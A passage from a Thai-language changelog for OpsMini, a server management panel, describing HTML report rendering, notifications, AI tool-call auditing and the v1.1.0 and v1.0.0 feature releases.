**รายงาน HTML ไฟล์เดียว**

- **รายงานคือไฟล์ HTML ที่สมบูรณ์ในตัวเองหนึ่งไฟล์**: สไตล์ฝังในไฟล์ ไม่มีสคริปต์ ไม่มีสไตล์ชีตภายนอก ไม่มีเว็บฟอนต์ ไม่มีรูปภาพ จึงแสดงผลได้จากแฟลชไดรฟ์ เป็นไฟล์แนบอีเมล หรือบนเว็บเซิร์ฟเวอร์ใดก็ได้
- **เปิดหรือดาวน์โหลด**: แต่ละแถวของงานมีปุ่ม "เปิด" (แสดงในแท็บใหม่ทันที) และ "ดาวน์โหลด" ชื่อไฟล์ภาษาจีนเข้ารหัสตาม RFC 5987
- **เก็บถาวรในไดเรกทอรีข้อมูล**: ทั้ง `.html` และ `.md` ถูกเก็บใน `<ไดเรกทอรีข้อมูล>/reports/<ชื่องาน>/` ไฟล์ที่สร้างขึ้นทั้งหมดจัดเป็นไดเรกทอรีย่อยตามฟีเจอร์
- **การเรนเดอร์ที่ปลอดภัย**: เนื้อหารายงานมีข้อมูลจากโฮสต์ปนอยู่ (ล็อก โปรเซส บรรทัดคำสั่ง ค่าคอนฟิก) ตัวเรนเดอร์จะ escape ทั้งเอกสารเป็น HTML ก่อน แล้วจึงใส่กฎแบบอินไลน์ และอนุญาตเฉพาะลิงก์ http/https/mailto ดังนั้น `<script>` ในล็อกจะแสดงเป็นข้อความ พร้อมส่ง CSP ที่เข้มงวดอีกชั้น
- **เมื่อต้องการ PDF**: ใช้ "พิมพ์ → บันทึกเป็น PDF" ของเบราว์เซอร์บนหน้ารายงาน สไตล์ชีตมีกฎสำหรับการพิมพ์อยู่แล้ว

**การแจ้งเตือนและการตรวจสอบย้อนหลัง**

- **ตัวแจ้งเตือนร่วม**: แยกการกระจายการแจ้งเตือนออกมาเป็น `Notifier` กลาง (แผงควบคุม / อีเมล / WeCom / DingTalk / Feishu) ทำให้งาน AI และการแจ้งเตือนทำงานเหมือนกันทุกประการ หากไม่ได้เลือกช่องทางจะส่งเฉพาะในแผงควบคุม
- **ร่องรอยการตรวจสอบ**: การเรียกเครื่องมือของ AI ถูกบันทึกในบันทึกการตรวจสอบ (audit log) การถูกปฏิเสธระหว่างทำงานแบบไม่มีผู้ดูแลบันทึกเป็น `unattended-deny` การปฏิเสธโดยมนุษย์บันทึกด้วยคำนำหน้า `reject:`

**การปรับปรุงอื่น ๆ**

- แถบด้านข้างแสดงเวอร์ชันจริงจากแบ็กเอนด์แทนค่าที่เขียนตายตัว
- เพิ่มเอกสารออกแบบ `docs/ai-agent.md` ใน 7 ภาษา
- ผู้ดูแลสามารถปรับนโยบายรายเครื่องมือได้ที่ "AI Assistant → สิทธิ์เครื่องมือ" เครื่องมือความเสี่ยงสูงจะถูกล็อกเป็น "ต้องยืนยัน" เสมอ

## v1.1.0 (2026-09-21)

**การจัดการหลายเครื่อง (สถาปัตยกรรม Agent / Server)**

- **ไคลเอนต์ gRPC ของ Agent**: Agent เชื่อมต่อกับ OpsMini Server โดยรุกเข้าไป (สตรีมสองทาง gRPC แบบพอร์ตเดียว), heartbeat + การ reconnect แบบ exponential backoff, รับงาน execute / ไฟล์ และส่งผลลัพธ์กลับ
- **ฝั่ง OpsMini Server**: การลงทะเบียน / heartbeat / การจัดการการเชื่อมต่อ, การส่งงาน execute ลงมา, การรับผลลัพธ์ (โค้ดย้ายไปเป็นโปรเจกต์ย่อย Go แยก `opsmini-server/` ในโปรเจกต์ OpsAnt, OpsMini เก็บไว้เฉพาะ Agent)
- **การรันคำสั่ง / สคริปต์**: คำสั่ง command และสคริปต์ shell / python, ส่งผลลัพธ์กลับ (stdout / stderr / exit code / ระยะเวลาที่ใช้)
- **การดึงไฟล์ (PullFile)**: Server ดึงไฟล์จาก Agent (อัปโหลดแบบแบ่ง chunk + ตรวจสอบ size / md5)
- **การส่งไฟล์ลงมา (PushFile)**: Server ส่งไฟล์ให้ Agent (แบ่ง chunk + ส่งต่อจากจุดที่ขาด + ตรวจสอบ md5), รองรับปลายทางเป็นไดเรกทอรี (คงชื่อไฟล์เดิม)
- **การตรวจสอบสถานะการเชื่อมต่อ + การรักษาการเชื่อมต่อแบบยาวนาน**: สถานะออนไลน์ / ออฟไลน์ของ Agent, การตัดสินใจหมดเวลา heartbeat, gRPC keepalive
- **การเชื่อมต่อ OpsAnt**: หน้า「การตั้งค่า」ในพาเนล กำหนดค่าที่อยู่ / Token ของ OpsAnt แบบเห็นภาพ (สลับได้ขณะรัน, การแสดง Token รองรับการสลับข้อความธรรมดา / ข้อความที่ซ่อนด้วยไอคอนตา), การข้ามการยืนยันตัวตนด้วย SSO (เปิดตามค่าเริ่มต้น)
- **การนำ `/agent/v1` REST API ออก**: เปลี่ยนไปใช้สตรีมสองทาง gRPC (REST API เดิม และหน้าตั้งค่า「API Token」ใน frontend ถูกนำออกด้วย)

**การเพิ่มประสิทธิภาพฟังก์ชันของพาเนล**

- **การดาวน์โหลดไดเรกทอรีในหน้าไฟล์**: บีบอัดไดเรกทอรีเป็น zip เพื่อดาวน์โหลดได้ด้วยคลิกเดียว (แจ้งเตือนด้วย popup + ขนาดไดเรกทอรี + อัตราการใช้งานดิสก์ของพาร์ติชันที่อยู่)
- **การลบไดเรกทอรีในหน้าไฟล์**: ลบไดเรกทอรีแบบ recursive (popup การทำงานที่อันตราย + ยืนยันซ้ำโดยพิมพ์ชื่อไดเรกทอรี)
- **การปรับปรุงชื่อยาวในหน้าไฟล์**: ชื่อไฟล์ / ไดเรกทอรีที่ยาวเกินไปแสดงแบบตัดด้วย ellipsis, ดูชื่อเต็มได้โดยการ hover (ขจัดแถบเลื่อนแนวนอน)
- **ตาราง routing ของ「เครือข่าย」ในการจัดการระบบ**: เพิ่มการแสดงตาราง routing ใต้การ์ดเครือข่าย (เครือข่ายปลายทาง / เกตเวย์ / subnet mask / flags / อินเทอร์เฟซ / metric)
- **การเพิ่มประสิทธิภาพการกำหนดค่า MCP**: รองรับ 2 วิธีการป้อนข้อมูลคือ「ไฟล์กำหนดค่า (JSON)」และ「ตาราง」; วิธี SSE / HTTP รองรับ custom request header (หลายตัว) และเวลา timeout
- **การเพิ่มประสิทธิภาพไฟร์วอลล์**: อนุญาตพอร์ตพาเนลและพอร์ต SSH (22) โดยอัตโนมัติก่อนเปิดใช้งาน เพื่อหลีกเลี่ยงการเข้าไม่ได้หลังเปิดใช้งาน; จดจำ ufw ที่「ติดตั้งแล้วแต่ยังไม่ได้เปิดใช้งาน」
- **การเพิ่มประสิทธิภาพเมตริก Prometheus**: เพิ่มอัตราการใช้งานแบบทันที `opsmini_cpu_usage_percent` / `opsmini_mem_usage_percent`, จำนวนโปรเซสทั้งหมด `node_procs_total`
- **popup ยืนยันแบบรวมศูนย์**: การลบ / การทำงานที่อันตรายทั้งหมดเปลี่ยนไปใช้ popup ยืนยันของแพลตฟอร์ม (แทนที่ confirm ดั้งเดิมของเบราว์เซอร์)

**การปรับปรุงเทอร์มินัล**

- **ช่องว่างของเอาต์พุต**: เพิ่มช่องว่างซ้ายขวา / ด้านล่างของเอาต์พุตคำสั่ง ไม่ชิดขอบอีกต่อไป
- **การแก้ไข Esc ในโหมดเต็มหน้าจอ**: กด Esc ในโหมดเต็มหน้าจอจะไม่ออกจากโหมดเต็มหน้าจออีกต่อไป (หลีกเลี่ยงความขัดแย้งกับ Esc ในโหมดแก้ไขของ vim)
- **การรักษาเซสชัน**: เซสชันเทอร์มินัลจะไม่รีเซ็ตหลังจากเปลี่ยนหน้า (คงอยู่ภายในอายุของเซสชัน)
- **การตั้งค่าชุดตัวอักษร**: เพิ่มการเลือกชุดตัวอักษร (UTF-8 / GBK / GB18030 / Big5) แก้ปัญหาการแสดงผลภาษาจีนเป็นอักขระที่อ่านไม่ได้

**การปรับปรุงประสบการณ์**

- **ชื่อหน้าเพจ**: แสดง「OpsMini · ที่อยู่สำหรับเข้าถึง」, แยกแยะได้เมื่อเปิดหลายแท็บ
- **การมองเห็นรหัสผ่าน**: ช่องป้อนข้อมูล เช่น การเปลี่ยนรหัสผ่าน, Token สำหรับเชื่อมต่อ OpsAnt เพิ่มไอคอนตา「แสดง / ซ่อน」
- **เลย์เอาต์หน้าตั้งค่า**: แสดง「การยืนยันตัวตนสองปัจจัย」และ「การเชื่อมต่อ OpsAnt」แบบเคียงข้างกัน, นำสวิตช์「การอัปเดตอัตโนมัติ」ออก

## v1.0.0 (2026-09-13)

OpsMini เวอร์ชันทางการรุ่นแรก ส่งมอบเป็นไบนารีเดียว ความสามารถหลัก:

- **การปฏิบัติการด้วย AI**: วินิจฉัยด้วยภาษาธรรมชาติ การวิเคราะห์ล็อกอัจฉริยะ การสร้างและรันคำสั่ง (เอาต์พุตสตรีม SSE) การเชื่อมต่อเครื่องมือ MCP
- **การมอนิเตอร์และการแจ้งเตือน**: เก็บเมตริกอนุกรมเวลา CPU / หน่วยความจำ / ดิสก์ / เครือข่าย กฎการแจ้งเตือนรองรับการแจ้งเตือนผ่านอีเมล พาเนล WeCom DingTalk และบอตกลุ่ม Feishu
- **ความปลอดภัยของโฮสต์**: คะแนนความปลอดภัย การตรวจสอบ baseline การมอนิเตอร์ความสมบูรณ์ของไฟล์ (FIM) การตรวจจับภัยคุกคาม ไฟร์วอลล์ ความปลอดภัยการล็อกอิน
- **ร้านซอฟต์แวร์**: หมวดหมู่แอปพลิเคชัน + ติดตั้งคลิกเดียว + ซิงค์เทมเพลตทางการ
- **ทักษะ AI (Skill Hub)**: ค้นหา ติดตั้ง อัปโหลดทักษะ
- **เว็บเทอร์มินัล**: เชลล์โต้ตอบ WebSocket + pty หลายเซสชัน
- **การปฏิบัติการทั่วไป**: เว็บไซต์ ฐานข้อมูล งานตามกำหนดเวลา การจัดการไฟล์

- **การส่งออกมอนิเตอร์**: เอนด์พอยต์ Prometheus `/metrics` (เข้ากันได้กับ node_exporter)
- **การจัดการการแจ้งเตือน**: SMTP / WeCom / DingTalk / Feishu
- **การลดความซับซ้อนของการกำหนดค่า**: คีย์ JWT, Agent Token, การกำหนดค่า AI ทั้งหมดอยู่ในพาเนล ไฟล์กำหนดค่าเหลือเฉพาะรายการขั้นต่ำ
- **ระบบล็อก**: ระดับล็อกกำหนดค่าได้ (info / warn / error) ล็อกเขียนลงดิสก์
- **การกู้คืนบัญชี**: คำสั่งย่อย `-reset-pass` / `-reset-mfa`
- **i18n 7 ภาษา**: จีนตัวย่อ / จีนตัวเต็ม / อังกฤษ / ญี่ปุ่น / เกาหลี / ไทย / เยอรมัน
- **UI มินิมอลสีขาว**: โทนสีขาว + ตัวอักษรสีดำ แต้มสีน้ำเงินแบรนด์
- **API คู่**: `/api/v1` (สำหรับเบราว์เซอร์) + `/agent/v1` (REST มาตรฐานระหว่างเครื่อง)
